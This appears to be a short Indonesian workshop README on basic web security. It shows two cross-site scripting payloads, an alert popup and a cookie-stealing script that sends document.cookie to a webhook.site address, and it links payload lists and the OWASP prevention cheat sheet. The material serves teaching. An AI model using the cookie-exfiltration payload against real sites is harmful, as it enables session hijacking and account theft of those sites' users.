# Web Basic

## File Presentasi
[https://docs.google.com/presentation/d/1Azj513-Xsgi4o93fVbIzi9CiNaGqRqai7tx2Ue-TBYs/edit?usp=sharing](https://docs.google.com/presentation/d/1oHtpDFFgKNm0D-NF5xlUeM5aKFHcAlt85Xabsd-U94Q/edit?usp=sharing)

## Contoh Payload
Memunculkan popup
```
<script>alert('XSS')</script>
```
Stealing Cookie bisa menggunakan bantuan [webhook.site](webhook.site) dengan contoh payload berikut
```
<script>
new Image().src = "https://webhook.site/3dd6c027-758d-4e54-8a10-8b0ff20fb9a2/?cookie=" + document.cookie;
</script>
```
Untuk URL webhook bisa disesuaikan menurut `unique URL` yang ada webhook Anda.

## Referensi
* About XSS [https://www.youtube.com/watch?v=EoaDgUgS6QA](https://www.youtube.com/watch?v=EoaDgUgS6QA)
* Example XSS payload [https://github.com/payloadbox/xss-payload-list](https://github.com/payloadbox/xss-payload-list)
* XSS Prevention Cheatsheets [https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)